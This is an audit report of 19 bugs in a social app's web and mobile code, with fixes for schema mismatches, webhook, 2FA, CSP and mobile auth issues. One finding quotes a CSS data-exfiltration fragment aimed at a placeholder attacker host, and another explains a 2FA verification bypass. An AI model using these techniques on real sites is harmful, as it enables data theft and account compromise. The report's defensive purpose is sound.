# Zobia Social — Independent Forensic Bug Report
**Date:** Saturday, June 20, 2026 | **Time:** 9:17 PM UTC

---

## Code Quality Rating

**Current state: 6.5 / 10**
The codebase demonstrates solid architectural intent — idempotent coin ledgers, CTE-gated XP awards, Redis sliding-window rate limiting, nonce-based CSP, per-request trace IDs, payout reversal guards, and thorough SSRF protection. Engineers clearly thought about concurrency, deduplication, and security layering. However, a cluster of critical schema/SQL mismatches between the application layer and the DB schema means several core safety systems (XP dead-letter queue, webhook retry, war resolution) are silently broken at runtime — they compile and deploy cleanly but fail at the first DB round-trip. A handful of medium-severity auth and leaderboard consistency issues round out the list.

**Projected rating after all fixes applied: 8.5 / 10**
Fixing the schema/column mismatches restores the safety nets that were clearly designed correctly. The residual gap to 10/10 is the inherent complexity of a multi-subsystem social app — there will always be edge cases in coalition XP, leaderboard freshness, and notification deduplication.

---

## Bug Index (one-line summary)

1. `failed_xp_awards` missing unique index — XP dead-letter queue ON CONFLICT always throws, failed XP silently lost
2. `audit_discrepancies` missing unique index — balance discrepancy ON CONFLICT always throws, tracking silently broken
3. `failed_webhooks` wrong column names — webhook retry CRON queries `resolved` + `last_error` which don't exist
4. `guilds.wars_drawn` column missing — guild war draw resolution crashes the entire resolveWar transaction
5. `store_items.slug` column missing — Dodo coin/star pack grant lookup fails, users pay but receive nothing
6. Webhook endpoints not in PUBLIC_PREFIXES — CSRF middleware returns 403 to all Paystack/Dodo webhook POSTs
7. `verifyTotp()` missing `await` in 2FA setup POST — any 6-digit code accepted, 2FA validation fully bypassed
8. `sendPushNotificationBatch` no device_id dedup — users get duplicate push notifications per batch call
9. Alliance war tie resolution awards alliance_1 as winner instead of declaring a draw
10. Leaderboard rank-change notifications inserted without `reference_id` — partial index never fires, duplicates accumulate per CRON run
11. Guild tier promotion check runs after demotion in same loop — a demoted guild can also be incorrectly promoted
12. Guild tier demotion not logged to `guild_tier_history`
13. `guildQuestContributions` has no unique constraint on (questId, userId) — concurrent duplicate contributions possible
14. Season pass milestone XP bonus award skips `upsertLeaderboardSnapshot` — leaderboard stale after claim
15. Daily login XP CRON only updates global leaderboard scope — city and season leaderboards miss daily login XP
16. `style-src 'unsafe-inline'` in CSP — weakens XSS protection, enables CSS injection
17. Mobile auth: `onUnauthenticated` does not clear SecureStore — stale credentials persist on device
18. Mobile auth: `sessionExpired` state not cleared when user signs back in
19. Mobile auth: stored `user` object not refreshed after silent token rotation — stale XP/rank displayed

---

## Detailed Bug Entries

---

### 1: BUG-XDL-01 — `failed_xp_awards` missing unique index; XP DLQ ON CONFLICT always throws

**FILES:**
- `apps/web/lib/db/schema.ts` (lines 2278–2292 — `failedXpAwards` table definition)
- `apps/web/lib/xp/safeAwardXP.ts` (lines 123–130 — DLQ INSERT with ON CONFLICT)

**FIX:** The `safeAwardXP` DLQ INSERT uses `ON CONFLICT (user_id, source, reference_id) WHERE reference_id IS NOT NULL DO NOTHING`. PostgreSQL requires a matching unique index or constraint for any `ON CONFLICT` target — none exists on `failed_xp_awards`. At runtime every DLQ write throws `ERROR: there is no unique or exclusion constraint matching the ON CONFLICT specification`, which is caught by the `.catch()` handler and silently swallowed. The result: every failed XP award is permanently lost rather than queued for retry. Add a partial unique index to the migration: `CREATE UNIQUE INDEX uidx_failed_xp_awards_ref ON failed_xp_awards (user_id, source, reference_id) WHERE reference_id IS NOT NULL;`. Also confirm the Drizzle schema adds this index so future migrations carry it forward.

---

### 2: BUG-AUD-01 — `audit_discrepancies` missing unique index; ON CONFLICT always throws

**FILES:**
- `apps/web/lib/db/schema.ts` (lines 2263–2276 — `auditDiscrepancies` table — no unique index defined)
- `apps/web/app/api/cron/daily-platform/route.ts` (lines 559–580 — `ON CONFLICT (user_id, asset_type)` upserts)
- `apps/web/app/api/cron/reconcile-balances/route.ts` (similar `ON CONFLICT` upserts)

**FIX:** Both CRON routes attempt `INSERT INTO audit_discrepancies ... ON CONFLICT (user_id, asset_type) DO UPDATE SET ...` but the table has no unique index on those columns, causing a PostgreSQL error on every insert attempt. The error is caught and logged, meaning discrepancy rows are never written — the reconciliation system is a silent no-op. Add the migration: `CREATE UNIQUE INDEX uidx_audit_discrepancies_user_asset ON audit_discrepancies (user_id, asset_type);`. Add the corresponding index definition in the Drizzle schema.

---

### 3: BUG-WBK-01 — `failed_webhooks` wrong column names; webhook retry CRON completely broken

**FILES:**
- `apps/web/lib/db/schema.ts` (lines 3719–3731 — `failedWebhooks` table has `error`, `resolvedAt`, no `resolved` boolean, no `last_error`)
- `apps/web/app/api/cron/daily-platform/route.ts` (lines 487–518 — webhook retry logic)

**FIX:** The webhook retry CRON queries `WHERE resolved = false` and sets `resolved = true` and `last_error = $2`, but the schema has no `resolved` boolean column (only `resolved_at` timestamp) and no `last_error` column (only `error`). Every query in the retry block throws a PostgreSQL column-not-found error, making the entire webhook retry system non-functional. Change the SELECT to `WHERE resolved_at IS NULL`, change the success UPDATE to `SET resolved_at = NOW()`, and change `SET last_error = $2` to `SET error = $2`. Also note that the table lacks a `provider` column filter — retry should ideally scope to a specific provider to avoid re-running a Paystack handler with Dodo payload.

---

### 4: BUG-WAR-01 — `guilds.wars_drawn` column missing; draw resolution crashes

**FILES:**
- `apps/web/lib/db/schema.ts` (lines 765–766 — `guilds` has `wars_won`, `wars_lost` but no `wars_drawn`)
- `apps/web/lib/guilds/warEngine.ts` (lines 386–390 — `UPDATE guilds SET wars_drawn = wars_drawn + 1`)

**FIX:** When a guild war ends in a draw, `resolveWar()` executes `UPDATE guilds SET wars_drawn = wars_drawn + 1`. The `wars_drawn` column does not exist in the `guilds` table, so PostgreSQL throws an error. Because this runs inside the `db.transaction()` block, the entire war resolution is rolled back — the war stays in `active` status, no XP is distributed, no draw XP is awarded, and `last_war_ended_at` is not set. Add `wars_drawn integer NOT NULL DEFAULT 0` to the guilds table migration and add the corresponding Drizzle column definition.

---

### 5: BUG-DOD-01 — `store_items.slug` column missing; Dodo coin/star pack grants fail silently

**FILES:**
- `apps/web/lib/db/schema.ts` (`storeItems` table — no `slug` column)
- `apps/web/lib/payments/dodoWebhookHandler.ts` (grant lookup uses `WHERE slug = $1`)

**FIX:** The Dodo webhook handler resolves coin/star pack grants by looking up `store_items WHERE slug = $1` using the `itemSlug` from event metadata. The `store_items` table has no `slug` column — only `id`, `name`, `item_type`, `price_kobo`, `coins_granted`, etc. The SQL query throws a column-not-found error, the handler catches it and marks the payment as processed, and the user receives no coins or stars. Either add a `slug` column to `store_items` with a migration and populate it, or change the Dodo handler to look up by `id` (matching the Paystack handler which uses `WHERE id = $1`). The simpler fix is to align with the Paystack handler and use the `id` field — this requires ensuring the Dodo payment metadata stores the item UUID rather than a slug string.

---

### 6: BUG-CSRF-WBK — Paystack/Dodo webhook endpoints blocked by CSRF middleware; all webhooks return 403

**FILES:**
- `apps/web/middleware.ts` (lines 92–134 — `PUBLIC_PREFIXES` list; lines 267–280 — CSRF check)

**FIX:** The Edge Middleware applies a CSRF Origin-header check to all non-public POST requests to `/api/*`. Incoming Paystack and Dodo webhook deliveries are `POST` requests with no `Origin` header (they originate from payment provider servers, not browsers). The paths `/api/economy/webhooks/paystack` and `/api/economy/webhooks/dodopayments` are absent from `PUBLIC_PREFIXES`, so `isCsrfSafe()` returns `false` and the middleware returns `403 Forbidden`. No webhook event ever reaches the route handler; coin credits, star credits, payout updates, and subscription activations all fail silently. Add both paths to `PUBLIC_PREFIXES`: `"/api/economy/webhooks/paystack"` and `"/api/economy/webhooks/dodopayments"`. The route handlers already validate HMAC signatures before any processing, so bypassing the middleware CSRF check here is safe.

---

### 7: BUG-2FA-01 — Missing `await` on `verifyTotp()` in 2FA setup POST; any code accepted

**FILES:**
- `apps/web/app/api/auth/2fa/setup/route.ts` (line 122)
- `apps/web/lib/auth/totp.ts` (`verifyTotp` function — async)

**FIX:** In the 2FA setup confirmation handler, line 122 reads `if (!verifyTotp(pendingSecret, code))`. The `verifyTotp` function is `async` (confirmed by the admin TOTP handler which `await`s it). Without `await`, the call returns a `Promise<boolean>` object, which is always truthy. Therefore `!verifyTotp(...)` is always `false`, the branch never throws, and any 6-digit code (or any string passing the regex) enables TOTP on the account. This is a critical security vulnerability — an attacker who can trigger the setup flow can lock in any TOTP code they choose, or an attacker with brief access can set up 2FA with a known code. Change the line to `if (!(await verifyTotp(pendingSecret, code)))`.

---

### 8: BUG-PUSH-01 — `sendPushNotificationBatch` no device_id deduplication; duplicate notifications sent

**FILES:**
- `apps/web/lib/notifications/push.ts` (`sendPushNotificationBatch` function)

**FIX:** The single-recipient `sendPushNotification` function deduplicates by `device_id` — if a user has registered multiple push tokens from the same physical device, only one token is used per notification. The batch variant `sendPushNotificationBatch` does not apply this deduplication. When a batch notification fires (e.g., mystery XP drop, leaderboard movement, system announcements), users with multiple device tokens (e.g., after reinstalling the app without unregistering old tokens) receive one push notification per token on the same device. Apply the same device-id deduplication logic from `sendPushNotification` to the batch path — group tokens by device_id before calling the Expo push API, keeping only the most recent token per device.

---

### 9: BUG-AWAR-01 — Alliance war tie resolution incorrectly awards alliance_1 as winner

**FILES:**
- `apps/web/app/api/cron/daily-platform/route.ts` (alliance war resolution block, `if (score1 >= score2)`)

**FIX:** The alliance war resolution uses `if (score1 >= score2)` to determine the winner. When `score1 === score2` (a tie), this condition is `true`, so alliance_1 is always declared the winner. There is no draw path: both guilds' `wars_won`/`wars_lost` counters are updated incorrectly, no draw XP is awarded, and alliance_1 unfairly accumulates a win. Change the condition to `if (score1 > score2)` for a clear win; add an `else if (score1 === score2)` draw branch analogous to the guild war draw logic in `warEngine.ts` that awards draw XP to both alliances and updates a `draws` counter without crediting a winner.

---

### 10: BUG-NOTIF-01 — Rank-change notifications missing `reference_id`; duplicate notifications per CRON run

**FILES:**
- `apps/web/app/api/cron/leaderboards/route.ts` (rank-change notification INSERT with `ON CONFLICT DO NOTHING`)

**FIX:** The leaderboard CRON inserts rank-change notifications using `ON CONFLICT DO NOTHING`. The `notifications` table has a partial unique index: `UNIQUE (user_id, type, reference_id) WHERE reference_id IS NOT NULL`. Because the rank-change notification insert does not set `reference_id`, the partial index condition `WHERE reference_id IS NOT NULL` is never satisfied, so `ON CONFLICT DO NOTHING` has no effect. Each CRON run inserts a fresh duplicate notification. Over time, users accumulate hundreds of identical rank-change alerts. Fix by populating `reference_id` with a deterministic key such as `rank_change:{userId}:{track}:{scope}:{YYYY-MM-DD}` (or a hash thereof). This allows `ON CONFLICT DO NOTHING` to correctly suppress re-insertions within the same day.

---

### 11: BUG-GTIER-01 — Guild tier demotion/promotion run in same loop; just-demoted guilds may be incorrectly promoted

**FILES:**
- `apps/web/app/api/cron/daily-guilds/route.ts` (guild tier update loop)

**FIX:** The daily guild CRON iterates over guilds and checks both demotion and promotion criteria in the same pass using the guild's original `tier` value. If a guild meets the demotion threshold and is demoted during the loop iteration, the promotion check immediately after still reads the original (pre-demotion) tier from the loop variable and may find it meets promotion criteria. The result is that a guild can be demoted and then immediately re-promoted to its original tier, or vice versa. Add an early `continue` (or a boolean flag) after applying demotion so the promotion block is skipped in the same iteration. Alternatively, split the demotion and promotion passes into two separate loops, or reload the guild's tier from the DB before the promotion check.

---

### 12: BUG-GTIER-02 — Guild tier demotion not logged to `guild_tier_history`

**FILES:**
- `apps/web/app/api/cron/daily-guilds/route.ts` (guild tier demotion block)

**FIX:** When a guild is promoted, the CRON inserts a row into `guild_tier_history` recording the tier change. When a guild is demoted, no corresponding entry is written. This means tier demotions are invisible in audit history, making it impossible to investigate tier regression disputes or debug the tier algorithm. Add a `guild_tier_history` insert in the demotion branch, mirroring the structure used in the promotion branch (guild_id, from_tier, to_tier, guild_xp_at, timestamp).

---

### 13: BUG-GQST-01 — `guildQuestContributions` no unique constraint on (questId, userId); concurrent duplicates possible

**FILES:**
- `apps/web/lib/db/schema.ts` (lines 890–900 — `guildQuestContributions` table, no unique index)

**FIX:** The `guild_quest_contributions` table tracks each guild member's contribution to a quest, but has no unique constraint on `(quest_id, user_id)`. If a user triggers the contribution increment endpoint concurrently (e.g., rapid taps, network retry), multiple rows can be inserted for the same user+quest. The quest engine likely sums contributions, so duplicate rows inflate the progress count, potentially causing quests to complete prematurely or multiple times. Add a unique constraint: `UNIQUE (quest_id, user_id)`. Update the contribution INSERT to use `ON CONFLICT (quest_id, user_id) DO UPDATE SET amount = amount + EXCLUDED.amount` for a safe increment-on-conflict pattern.

---

### 14: BUG-SLDR-01 — Season milestone XP bonus skips `upsertLeaderboardSnapshot`; leaderboard stale after claim

**FILES:**
- `apps/web/lib/seasons/seasonEngine.ts` (`claimPassMilestone` function, lines 589–609)

**FIX:** When a season pass milestone of type `xp_bonus` is claimed, the handler directly updates `users.xp_total` and `users.season_xp` via SQL, but never calls `upsertLeaderboardSnapshot`. Every other XP award path (safeAwardXP, war engine, quest engine) explicitly calls `upsertLeaderboardSnapshot` after crediting XP. As a result, a user who claims a milestone XP bonus sees their rank on the leaderboard not reflect the new XP until the next time any other XP is awarded. After the direct `UPDATE users SET xp_total = ...` query succeeds, call `upsertLeaderboardSnapshot(userId, 'main', newXpTotal, client)` and optionally also update the season scope snapshot with the new `season_xp` value. Alternatively, route the award through `safeAwardXP` to get consistent treatment, but note that `safeAwardXP` uses `globalDb` for the DLQ fallback, which differs from the transaction client passed to `claimPassMilestone`.

---

### 15: BUG-LDB-01 — Daily login XP CRON only updates global leaderboard; city and season snapshots not refreshed

**FILES:**
- `apps/web/app/api/cron/daily-core/route.ts` (leaderboard batch upsert after daily login XP award)

**FIX:** After the daily login XP batch is applied, the CRON calls `upsertLeaderboardSnapshot` with `scope='global'`, `city=NULL`, and `season_id=NULL` only. Users in city leaderboards and active seasons do not see their ranks updated from the daily login bonus. For each user receiving daily login XP, also upsert the city-scope snapshot (if the user has a city) and the season-scope snapshot (if there is an active season). The leaderboard engine's `upsertLeaderboardSnapshot` accepts `options.scope`, `options.city`, and `options.seasonId` parameters to support this.

---

### 16: BUG-CSP-01 — `style-src 'unsafe-inline'` in CSP weakens XSS protection

**FILES:**
- `apps/web/middleware.ts` (line 64 — `buildCsp` function)

**FIX:** The Content-Security-Policy built by `buildCsp()` includes `style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`. The `'unsafe-inline'` directive for `style-src` permits any inline `style` attribute or `<style>` tag to execute, enabling CSS injection attacks — an XSS payload or injected content can use CSS to exfiltrate data or overlay UI (e.g., `background: url(https://attacker.com/steal?c=` CSS data exfiltration). The script-src correctly omits `'unsafe-inline'` in favour of `'nonce-...'`. Apply the same pattern to style-src: remove `'unsafe-inline'` and add `'nonce-${nonce}'`. Server components that render inline `<style>` tags must apply the nonce via `x-nonce` (already forwarded by `withCsp`). Alternatively use `'unsafe-hashes'` with precomputed hashes for known static inline styles if nonce propagation to styles is not feasible.

---

### 17: BUG-MOB-AUTH-01 — Mobile: `onUnauthenticated` does not clear SecureStore; stale credentials persist

**FILES:**
- `apps/expo/lib/auth/context.tsx` (`onUnauthenticated` event handler)
- `apps/expo/lib/api/client.ts` (`notifyUnauthenticated` call site)

**FIX:** When `notifyUnauthenticated()` fires (token refresh failed), the auth context sets `sessionExpired=true` but does not remove the stale JWT, refresh token, or `user` object from SecureStore. On the next app launch or foreground, the SecureStore still contains these stale tokens. The API client will read them, attempt to use the expired JWT, hit a 401, call the refresh endpoint with the expired refresh token, fail again, and call `notifyUnauthenticated` in a loop or redirect to login with a confusing UX. In the `onUnauthenticated` handler, add `await SecureStore.deleteItemAsync(JWT_KEY)`, `await SecureStore.deleteItemAsync(REFRESH_TOKEN_KEY)`, and `await SecureStore.deleteItemAsync(USER_KEY)` (whatever key stores the user object) before or alongside setting `sessionExpired=true`.

---

### 18: BUG-MOB-AUTH-02 — Mobile: `sessionExpired` state not cleared on fresh sign-in

**FILES:**
- `apps/expo/lib/auth/context.tsx` (`signIn` function)

**FIX:** The `sessionExpired` boolean is set to `true` when a session expires. When the user successfully signs back in via the login screen, `signIn` stores new tokens and updates the `user` state, but does not reset `sessionExpired` to `false`. Any UI that conditionally renders based on `sessionExpired` (banners, modals, redirects) may continue showing the expired-session indicator even after a successful fresh login. Add `setSessionExpired(false)` at the start or successful completion of the `signIn` function.

---

### 19: BUG-MOB-AUTH-03 — Mobile: stored `user` object not updated after silent token rotation

**FILES:**
- `apps/expo/lib/api/client.ts` (`refreshAccessToken` function, lines 80–120)
- `apps/expo/lib/auth/context.tsx` (user state management)

**FIX:** During silent token rotation (401 → refresh → new access token), the client stores the new access token in SecureStore and updates the axios Authorization header. However, the `user` object in SecureStore (which holds XP total, rank tier, plan, etc. decoded from the JWT payload) is not updated from the new token's payload. Over time, the displayed profile — XP bar, rank badge, plan badge — reflects state from the original login, not the current state. The JWT payload is re-issued on every rotation. After a successful refresh, decode the new access token payload (or fetch `/api/users/me`) and update both the SecureStore user object and the in-memory auth context `user` state.

---

## Summary

| Severity | Count |
|----------|-------|
| Critical | 5 |
| High | 7 |
| Medium | 4 |
| Low / Informational | 3 |
| **Total** | **19** |

---

*Report generated by independent forensic analysis on Saturday, June 20, 2026 at 9:17 PM UTC.*
*No existing bug reports, issue trackers, or prior analyses were referenced.*
